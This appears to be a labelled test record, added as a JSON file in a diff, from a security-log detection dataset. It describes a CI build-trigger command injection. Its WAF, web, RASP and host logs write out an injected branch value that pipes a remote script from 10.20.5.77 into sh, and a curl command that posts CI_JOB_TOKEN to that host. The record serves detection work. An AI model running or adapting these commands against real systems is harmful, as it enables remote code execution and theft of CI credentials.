@@ -1,0 +1,57 @@
+{
+ "unit": 1125,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "CI 构建参数命令注入（branch 参数拼接 shell 并外带 CI_JOB_TOKEN）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-15 04:22:53",
+   "source": "waf",
+   "log_id": "WAF0501692",
+   "content": "/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_",
+   "event_id": "1125-WAF0501692"
+  },
+  {
+   "timestamp": "2026-07-15 04:22:54",
+   "source": "web",
+   "log_id": "WEB0504955",
+   "content": "/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_",
+   "event_id": "1125-WEB0504955"
+  },
+  {
+   "timestamp": "2026-07-15 04:22:56",
+   "source": "rasp",
+   "log_id": "RASP0555087",
+   "content": "https://app-node-170.ops-corp.com/api/v1/build/trigger {\"param_inject\": \"branch\", \"cmd\": \"curl|sh\"} Mozilla/5.",
+   "event_id": "1125-RASP0555087"
+  },
+  {
+   "timestamp": "2026-07-15 04:23:54",
+   "source": "hids",
+   "log_id": "HID0543698",
+   "content": "curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm",
+   "event_id": "1125-HID0543698"
+  },
+  {
+   "timestamp": "2026-07-15 04:24:36",
+   "source": "hids",
+   "log_id": "HID0543701",
+   "content": "curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node",
+   "event_id": "1125-HID0543701"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
